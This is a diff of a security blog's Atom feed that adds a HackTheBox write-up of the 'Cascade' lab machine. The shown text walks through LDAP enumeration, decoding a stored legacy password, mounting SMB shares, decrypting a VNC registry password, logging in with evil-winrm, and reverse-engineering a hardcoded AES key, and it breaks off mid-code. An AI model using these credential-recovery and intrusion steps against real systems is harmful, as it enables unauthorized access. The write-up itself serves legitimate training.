@@ -1,5 +1,506 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-07-22T09:35:00+02:00</updated><entry><title>HTB: Sauna</title><link href="https://maggick.fr/2020/07/htb-sauna.html" rel="alternate"></link><published>2020-07-22T09:35:00+02:00</published><updated>2020-07-22T09:35:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-22:/2020/07/htb-sauna.html</id><summary type="html">&lt;p&gt;&lt;img alt="Craft card" class="align-left" src="/media/2020.07/sauna_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-07-26T09:30:00+02:00</updated><entry><title>HTB: Cascade</title><link href="https://maggick.fr/2020/07/htb-cascade.html" rel="alternate"></link><published>2020-07-26T09:30:00+02:00</published><updated>2020-07-26T09:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-26:/2020/07/htb-cascade.html</id><summary type="html">&lt;p&gt;&lt;img alt="Cascade Card" class="align-left" src="/media/2020.07/cascade_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/235"&gt;Cascade&lt;/a&gt; publish on
+Mars 28 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/158833"&gt;VbScrub&lt;/a&gt;.
+This box is rated as medium box. It implies some LDAP search, some SMB shares,
+a VNC registry, some reverse engineering and the AD Recycle Bin.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.07/cascade_card.png" alt="Cascade Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/235"&gt;Cascade&lt;/a&gt; publish on
+Mars 28 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/158833"&gt;VbScrub&lt;/a&gt;.
+This box is rated as medium box. It implies some LDAP search, some SMB shares,
+a VNC registry, some reverse engineering and the AD Recycle Bin.&lt;/p&gt;
+
+
+&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
+&lt;h2 id="nmap"&gt;nmap&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. The box is quit busy so first of all we
+run a simple nmap scan:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Fri Apr 10 05:54:33 2020 as: nmap -p- -sSV -oN nmap 10.10.10.182&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.182&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.084s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65520 filtered ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT      STATE SERVICE       VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)&lt;/span&gt;
+&lt;span class="code-line"&gt;88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-10 09:59:25Z)&lt;/span&gt;
+&lt;span class="code-line"&gt;135/tcp   open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn&lt;/span&gt;
+&lt;span class="code-line"&gt;389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)&lt;/span&gt;
+&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds?&lt;/span&gt;
+&lt;span class="code-line"&gt;636/tcp   open  tcpwrapped&lt;/span&gt;
+&lt;span class="code-line"&gt;3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)&lt;/span&gt;
+&lt;span class="code-line"&gt;3269/tcp  open  tcpwrapped&lt;/span&gt;
+&lt;span class="code-line"&gt;5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
+&lt;span class="code-line"&gt;49154/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49155/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0&lt;/span&gt;
+&lt;span class="code-line"&gt;49158/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;49165/tcp open  msrpc         Microsoft Windows RPC&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Fri Apr 10 05:57:39 2020 -- 1 IP address (1 host up) scanned in 185.33 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;As always with Windows box there is a lot of open ports and services.
+We try to enumerate a few of them and run
+&lt;a href="https://github.com/portcullislabs/enum4linux"&gt;enum4linux&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id="ldap"&gt;LDAP&lt;/h2&gt;
+&lt;p&gt;The interesting service is the LDAP. When enumerating and reading the result we
+discover that the &lt;code&gt;r.thompson&lt;/code&gt; account as a filed &lt;code&gt;cascadeLegacyPwd&lt;/code&gt; containing
+some base64 data.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ldapsearch -h 10.10.10.182 -p 389 -x -b &amp;quot;dc=cascade,dc=local&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Ryan Thompson, Users, UK, cascade.local&lt;/span&gt;
+&lt;span class="code-line"&gt;dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local&lt;/span&gt;
+&lt;span class="code-line"&gt;objectClass: top&lt;/span&gt;
+&lt;span class="code-line"&gt;objectClass: person&lt;/span&gt;
+&lt;span class="code-line"&gt;objectClass: organizationalPerson&lt;/span&gt;
+&lt;span class="code-line"&gt;objectClass: user&lt;/span&gt;
+&lt;span class="code-line"&gt;cn: Ryan Thompson&lt;/span&gt;
+&lt;span class="code-line"&gt;sn: Thompson&lt;/span&gt;
+&lt;span class="code-line"&gt;givenName: Ryan&lt;/span&gt;
+&lt;span class="code-line"&gt;distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local&lt;/span&gt;
+&lt;span class="code-line"&gt;instanceType: 4&lt;/span&gt;
+&lt;span class="code-line"&gt;whenCreated: 20200109193126.0Z&lt;/span&gt;
+&lt;span class="code-line"&gt;whenChanged: 20200323112031.0Z&lt;/span&gt;
+&lt;span class="code-line"&gt;displayName: Ryan Thompson&lt;/span&gt;
+&lt;span class="code-line"&gt;uSNCreated: 24610&lt;/span&gt;
+&lt;span class="code-line"&gt;memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local&lt;/span&gt;
+&lt;span class="code-line"&gt;uSNChanged: 295010&lt;/span&gt;
+&lt;span class="code-line"&gt;name: Ryan Thompson&lt;/span&gt;
+&lt;span class="code-line"&gt;objectGUID:: LfpD6qngUkupEy9bFXBBjA==&lt;/span&gt;
+&lt;span class="code-line"&gt;userAccountControl: 66048&lt;/span&gt;
+&lt;span class="code-line"&gt;badPwdCount: 1&lt;/span&gt;
+&lt;span class="code-line"&gt;codePage: 0&lt;/span&gt;
+&lt;span class="code-line"&gt;countryCode: 0&lt;/span&gt;
+&lt;span class="code-line"&gt;badPasswordTime: 132309997863352844&lt;/span&gt;
+&lt;span class="code-line"&gt;lastLogoff: 0&lt;/span&gt;
+&lt;span class="code-line"&gt;lastLogon: 132247339125713230&lt;/span&gt;
+&lt;span class="code-line"&gt;pwdLastSet: 132230718862636251&lt;/span&gt;
+&lt;span class="code-line"&gt;primaryGroupID: 513&lt;/span&gt;
+&lt;span class="code-line"&gt;objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==&lt;/span&gt;
+&lt;span class="code-line"&gt;accountExpires: 9223372036854775807&lt;/span&gt;
+&lt;span class="code-line"&gt;logonCount: 2&lt;/span&gt;
+&lt;span class="code-line"&gt;sAMAccountName: r.thompson&lt;/span&gt;
+&lt;span class="code-line"&gt;sAMAccountType: 805306368&lt;/span&gt;
+&lt;span class="code-line"&gt;userPrincipalName: r.thompson@cascade.local&lt;/span&gt;
+&lt;span class="code-line"&gt;objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local&lt;/span&gt;
+&lt;span class="code-line"&gt;dSCorePropagationData: 20200126183918.0Z&lt;/span&gt;
+&lt;span class="code-line"&gt;dSCorePropagationData: 20200119174753.0Z&lt;/span&gt;
+&lt;span class="code-line"&gt;dSCorePropagationData: 20200119174719.0Z&lt;/span&gt;
+&lt;span class="code-line"&gt;dSCorePropagationData: 20200119174508.0Z&lt;/span&gt;
+&lt;span class="code-line"&gt;dSCorePropagationData: 16010101000000.0Z&lt;/span&gt;
+&lt;span class="code-line"&gt;lastLogonTimestamp: 132294360317419816&lt;/span&gt;
+&lt;span class="code-line"&gt;msDS-SupportedEncryptionTypes: 0&lt;/span&gt;
+&lt;span class="code-line"&gt;cascadeLegacyPwd: clk0bjVldmE=&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We decode it and found the password &lt;code&gt;rY4n5eva&lt;/code&gt; for the &lt;code&gt;r.thompson&lt;/code&gt; account.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$  echo -ne &amp;#39;clk0bjVldmE=&amp;#39; | base64 -d&lt;/span&gt;
+&lt;span class="code-line"&gt;rY4n5eva&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="smb-share"&gt;SMB share&lt;/h2&gt;
+&lt;p&gt;Using this account we can enumerate the available SMB shares.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$  smbclient -L \\\\10.10.10.182 -U &amp;#39;r.thompson&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;Unable to initialize messaging context&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter WORKGROUP\r.thompson&amp;#39;s password:&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        Sharename       Type      Comment&lt;/span&gt;
+&lt;span class="code-line"&gt;        ---------       ----      -------&lt;/span&gt;
+&lt;span class="code-line"&gt;        ADMIN$          Disk      Remote Admin&lt;/span&gt;
+&lt;span class="code-line"&gt;        Audit$          Disk&lt;/span&gt;
+&lt;span class="code-line"&gt;        C$              Disk      Default share&lt;/span&gt;
+&lt;span class="code-line"&gt;        Data            Disk&lt;/span&gt;
+&lt;span class="code-line"&gt;        IPC$            IPC       Remote IPC&lt;/span&gt;
+&lt;span class="code-line"&gt;        NETLOGON        Disk      Logon server share&lt;/span&gt;
+&lt;span class="code-line"&gt;        print$          Disk      Printer Drivers&lt;/span&gt;
+&lt;span class="code-line"&gt;        SYSVOL          Disk      Logon server share&lt;/span&gt;
+&lt;span class="code-line"&gt;SMB1 disabled -- no workgroup available&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We mount the &lt;code&gt;Data&lt;/code&gt; share using our account and list its content, the file &lt;code&gt;VNC
+Install.reg&lt;/code&gt; inside &lt;code&gt;s.smith&lt;/code&gt; folder seems interesting.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$  sudo mount //10.10.10.182/Data /mnt/ -o username=r.thompson&lt;/span&gt;
+&lt;span class="code-line"&gt;tree /mnt/&lt;/span&gt;
+&lt;span class="code-line"&gt;/mnt/&lt;/span&gt;
+&lt;span class="code-line"&gt;├── Contractors&lt;/span&gt;
+&lt;span class="code-line"&gt;├── Finance&lt;/span&gt;
+&lt;span class="code-line"&gt;├── IT&lt;/span&gt;
+&lt;span class="code-line"&gt;│   ├── Email Archives&lt;/span&gt;
+&lt;span class="code-line"&gt;│   │   └── Meeting_Notes_June_2018.html&lt;/span&gt;
+&lt;span class="code-line"&gt;│   ├── LogonAudit&lt;/span&gt;
+&lt;span class="code-line"&gt;│   ├── Logs&lt;/span&gt;
+&lt;span class="code-line"&gt;│   │   ├── Ark AD Recycle Bin&lt;/span&gt;
+&lt;span class="code-line"&gt;│   │   │   └── ArkAdRecycleBin.log&lt;/span&gt;
+&lt;span class="code-line"&gt;│   │   └── DCs&lt;/span&gt;
+&lt;span class="code-line"&gt;│   │       └── dcdiag.log&lt;/span&gt;
+&lt;span class="code-line"&gt;│   └── Temp&lt;/span&gt;
+&lt;span class="code-line"&gt;│       ├── r.thompson&lt;/span&gt;
+&lt;span class="code-line"&gt;│       └── s.smith&lt;/span&gt;
+&lt;span class="code-line"&gt;│           └── VNC Install.reg&lt;/span&gt;
+&lt;span class="code-line"&gt;├── Production&lt;/span&gt;
+&lt;span class="code-line"&gt;└── Temps&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;13 directories, 4 files&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This &lt;code&gt;VNC Install.reg&lt;/code&gt; file inside &lt;code&gt;s.smith&lt;/code&gt; folder is the Windows Registry of a VNC installation. The
+&lt;code&gt;Password&lt;/code&gt; entry is really interesting.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ cat /mnt/IT/Temp/s.smith/VNC\ Install.reg&lt;/span&gt;
+&lt;span class="code-line"&gt;��Windows Registry Editor Version 5.00&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;ExtraPorts&amp;quot;=&amp;quot;&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;QueryTimeout&amp;quot;=dword:0000001e&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;QueryAcceptOnTimeout&amp;quot;=dword:00000000&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;LocalInputPriorityTimeout&amp;quot;=dword:00000003&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;LocalInputPriority&amp;quot;=dword:00000000&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;BlockRemoteInput&amp;quot;=dword:00000000&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;BlockLocalInput&amp;quot;=dword:00000000&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;IpAccessControl&amp;quot;=&amp;quot;&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;RfbPort&amp;quot;=dword:0000170c&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;HttpPort&amp;quot;=dword:000016a8&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;DisconnectAction&amp;quot;=dword:00000000&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;AcceptRfbConnections&amp;quot;=dword:00000001&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;UseVncAuthentication&amp;quot;=dword:00000001&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;UseControlAuthentication&amp;quot;=dword:00000000&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;RepeatControlAuthentication&amp;quot;=dword:00000000&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;LoopbackOnly&amp;quot;=dword:00000000&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;AcceptHttpConnections&amp;quot;=dword:00000001&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;LogLevel&amp;quot;=dword:00000000&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;EnableFileTransfers&amp;quot;=dword:00000001&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;RemoveWallpaper&amp;quot;=dword:00000001&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;UseD3D&amp;quot;=dword:00000001&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;UseMirrorDriver&amp;quot;=dword:00000001&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;EnableUrlParams&amp;quot;=dword:00000001&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;Password&amp;quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;AlwaysShared&amp;quot;=dword:00000000&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;NeverShared&amp;quot;=dword:00000000&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;DisconnectClients&amp;quot;=dword:00000001&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;PollingInterval&amp;quot;=dword:000003e8&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;AllowLoopback&amp;quot;=dword:00000000&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;VideoRecognitionInterval&amp;quot;=dword:00000bb8&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;GrabTransparentWindows&amp;quot;=dword:00000001&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;SaveLogToAllUsersPath&amp;quot;=dword:00000000&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;RunControlInterface&amp;quot;=dword:00000001&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;IdleTimeout&amp;quot;=dword:00000000&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;VideoClasses&amp;quot;=&amp;quot;&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;quot;VideoRects&amp;quot;=&amp;quot;&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;A few Google search lead us to &lt;a href="https://github.com/frizb/PasswordDecrypts"&gt;github repository explaining how to decrypt the
+password&lt;/a&gt; using the Interactive Ruby
+Shell from metasploit.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ msfconsole&lt;/span&gt;
+&lt;span class="code-line"&gt;msf5 &amp;gt; irb&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Starting IRB shell...&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] You are in the &amp;quot;framework&amp;quot; object&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;irb: warn: can&amp;#39;t alias jobs from irb_jobs.&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;&amp;gt; fixedkey = &amp;quot;\x17\x52\x6b\x06\x23\x4e\x58\x07&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;=&amp;gt; &amp;quot;\u0017Rk\u0006#NX\a&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;&amp;gt; require &amp;#39;rex/proto/rfb&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;=&amp;gt; true&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;gt;&amp;gt; Rex::Proto::RFB::Cipher.decrypt [&amp;quot;6BCF2A4B6E5ACA0F&amp;quot;].pack(&amp;#39;H*&amp;#39;), fixedkey&lt;/span&gt;
+&lt;span class="code-line"&gt;=&amp;gt; &amp;quot;sT333ve2&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;With this account we can connect to the box using
+&lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt;. We quickly found the
+user flag inside on our user Desktop.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/tools/github/evil-winrm$ ruby ./evil-winrm.rb -i 10.10.10.182 -u s.smith -p sT333ve2&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\s.smith\Documents&amp;gt; type &amp;quot;C:\Users\s.smith\Desktop\user.txt&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;6c624e1637cf604fec1cda8de1ad0779&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
+&lt;p&gt;We try to mount some other share with our &lt;code&gt;s.smith&lt;/code&gt; account. &lt;code&gt;Audit&lt;/code&gt; is interesting as
+there is a executable binary &lt;code&gt;CascAudit.exe&lt;/code&gt;, a DLL &lt;code&gt;CascCrypto.dll&lt;/code&gt;, and a
+SQLite Database &lt;code&gt;Audit.db&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ sudo mount //10.10.10.182/Audit$ /mnt/ -o username=s.smith&lt;/span&gt;
+&lt;span class="code-line"&gt;Password for s.smith@//10.10.10.182/Audit$:  ********&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~$ tree /mnt/&lt;/span&gt;
+&lt;span class="code-line"&gt;/mnt/&lt;/span&gt;
+&lt;span class="code-line"&gt;├── CascAudit.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;├── CascCrypto.dll&lt;/span&gt;
+&lt;span class="code-line"&gt;├── DB&lt;/span&gt;
+&lt;span class="code-line"&gt;│   └── Audit.db&lt;/span&gt;
+&lt;span class="code-line"&gt;├── RunAudit.bat&lt;/span&gt;
+&lt;span class="code-line"&gt;├── System.Data.SQLite.dll&lt;/span&gt;
+&lt;span class="code-line"&gt;├── System.Data.SQLite.EF6.dll&lt;/span&gt;
+&lt;span class="code-line"&gt;├── x64&lt;/span&gt;
+&lt;span class="code-line"&gt;│   └── SQLite.Interop.dll&lt;/span&gt;
+&lt;span class="code-line"&gt;└── x86&lt;/span&gt;
+&lt;span class="code-line"&gt;    └── SQLite.Interop.dll&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;3 directories, 8 files&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We load the executable in &lt;a href="https://github.com/0xd4d/dnSpy"&gt;DNSpy&lt;/a&gt; and look at
+the code. We saw a function that use the Crypto DLL to decrypt a text providing
+from the database using the key &lt;code&gt;c4scadek3y654321&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;using (SQLiteConnection sqliteConnection = new SQLiteConnection(&amp;quot;Data Source=&amp;quot; + MyProject.Application.CommandLineArgs[0] + &amp;quot;;Version=3;&amp;quot;))&lt;/span&gt;
+&lt;span class="code-line"&gt;{&lt;/span&gt;
+&lt;span class="code-line"&gt;  string str = string.Empty;&lt;/span&gt;
+&lt;span class="code-line"&gt;  string password = string.Empty;&lt;/span&gt;
+&lt;span class="code-line"&gt;  string str2 = string.Empty;&lt;/span&gt;
+&lt;span class="code-line"&gt;  try&lt;/span&gt;
+&lt;span class="code-line"&gt;  {&lt;/span&gt;
+&lt;span class="code-line"&gt;    sqliteConnection.Open();&lt;/span&gt;
+&lt;span class="code-line"&gt;    using (SQLiteCommand sqliteCommand = new SQLiteCommand(&amp;quot;SELECT * FROM LDAP&amp;quot;, sqliteConnection))&lt;/span&gt;
+&lt;span class="code-line"&gt;    {&lt;/span&gt;
+&lt;span class="code-line"&gt;      using (SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader())&lt;/span&gt;
+&lt;span class="code-line"&gt;      {&lt;/span&gt;
+&lt;span class="code-line"&gt;        sqliteDataReader.Read();&lt;/span&gt;
+&lt;span class="code-line"&gt;        str = Conversions.ToString(sqliteDataReader[&amp;quot;Uname&amp;quot;]);&lt;/span&gt;
+&lt;span class="code-line"&gt;        str2 = Conversions.ToString(sqliteDataReader[&amp;quot;Domain&amp;quot;]);&lt;/span&gt;
+&lt;span class="code-line"&gt;        string text = Conversions.ToString(sqliteDataReader[&amp;quot;Pwd&amp;quot;]);&lt;/span&gt;
+&lt;span class="code-line"&gt;        try&lt;/span&gt;
+&lt;span class="code-line"&gt;        {&lt;/span&gt;
+&lt;span class="code-line"&gt;          password = Crypto.DecryptString(text, &amp;quot;c4scadek3y654321&amp;quot;);&lt;/span&gt;
+&lt;span class="code-line"&gt;        }&lt;/span&gt;
+&lt;span class="code-line"&gt;        catch (Exception ex)&lt;/span&gt;
+&lt;span class="code-line"&gt;        {&lt;/span&gt;
+&lt;span class="code-line"&gt;          Console.WriteLine(&amp;quot;Error decrypting password: &amp;quot; + ex.Message);&lt;/span&gt;
+&lt;span class="code-line"&gt;          return;&lt;/span&gt;
+&lt;span class="code-line"&gt;        }&lt;/span&gt;
+&lt;span class="code-line"&gt;      }&lt;/span&gt;
+&lt;span class="code-line"&gt;    }&lt;/span&gt;
+&lt;span class="code-line"&gt;    sqliteConnection.Close();&lt;/span&gt;
+&lt;span class="code-line"&gt;  }&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We repeat the SQL request using &lt;code&gt;sqlite3&lt;/code&gt; and got some base64 data for the
+user &lt;code&gt;ArkSvc&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_cascade$ sqlite3 Audit.db&lt;/span&gt;
+&lt;span class="code-line"&gt;SQLite version 3.31.0 2019-12-29 00:52:41&lt;/span&gt;
+&lt;span class="code-line"&gt;Enter &amp;quot;.help&amp;quot; for usage hints.&lt;/span&gt;
+&lt;span class="code-line"&gt;sqlite&amp;gt; SELECT * FROM LDAP;&lt;/span&gt;
+&lt;span class="code-line"&gt;1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We look at the crypto code in the DLL (still using &lt;a href="https://github.com/0xd4d/dnSpy"&gt;DNSpy&lt;/a&gt;).
+This is a simple AES using a fix IV and the key passed in parameter by the
+executable binary.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;// Token: 0x06000013 RID: 19 RVA: 0x00002360 File Offset: 0x00000760&lt;/span&gt;
+&lt;span class="code-line"&gt;public static string DecryptString(string EncryptedString, string Key)&lt;/span&gt;
+&lt;span class="code-line"&gt;{&lt;/span&gt;
+&lt;span class="code-line"&gt;  byte[] array = Convert.FromBase64String(EncryptedString);&lt;/span&gt;
+&lt;span class="code-line"&gt;  Aes aes = Aes.Create();&lt;/span&gt;
+&lt;span class="code-line"&gt;  aes.KeySize = 128;&lt;/span&gt;
+&lt;span class="code-line"&gt;  aes.BlockSize = 128;&lt;/span&gt;
